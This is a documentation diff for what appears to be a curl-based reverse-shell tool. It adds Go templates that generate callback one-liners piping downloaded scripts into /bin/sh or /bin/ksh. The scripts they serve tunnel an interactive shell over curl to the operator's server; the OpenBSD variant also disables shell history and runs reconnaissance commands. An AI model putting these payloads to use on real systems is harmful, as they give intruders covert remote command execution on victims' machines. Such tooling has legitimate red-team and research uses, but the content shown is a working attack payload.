@@ -57,6 +57,36 @@ curl -sk --pinnedpubkey sha256//{{.PubkeyFP}} --resolve kittens.com:4444:192.168
 {{- end -}}
 ```
 
+### OS-specific callback script
+Override a couple of [Subtemplates](#Subtemplates) to make requests to
+`/c/openbsd` work a little nicer.
+
+```
+{{/* Add OpenBSD-specific callback one-liners. */}}
+{{- define "callback" -}}
+{{template "curl" .}}/{{.URLPaths.Script}}/openbsd | /bin/ksh # OpenBSD
+{{template "curl" .}}/{{.URLPaths.Script}} | /bin/sh          # Other OSs
+{{- end -}}
+
+{{/* For OpenBSD targets, serve up a slightly nicer script. */}}
+{{- define "script" -}}
+
+{{- if eq "/c/openbsd" .Path -}} {{/* OpenBSD Gymnastics */}}
+#!/bin/ksh
+(export HISTFILE=/dev/null; ps awwfux; uname -a; id; exec /bin/ksh) >&1 |&
+{{template "curl" .}}/{{.URLPaths.In }}/{{.ID}} -N  >&p </dev/null 2>&0 &
+{{template "curl" .}}/{{.URLPaths.Out}}/{{.ID}} -T- <&p >/dev/null 2>&1 &
+
+{{ else }} {{/* Normal Unixish targets. */}}
+#!/bin/sh
+{{template "curl" .}}/{{.URLPaths.In }}/{{.ID}} -N  </dev/null 2>&0 |
+/bin/sh 2>&1 |
+{{template "curl" .}}/{{.URLPaths.Out}}/{{.ID}} -T- >/dev/null 2>&1
+
+{{- end -}}
+{{- end -}}
+```
+
 Subtemplates
 ------------
 The following subtemplates are available:
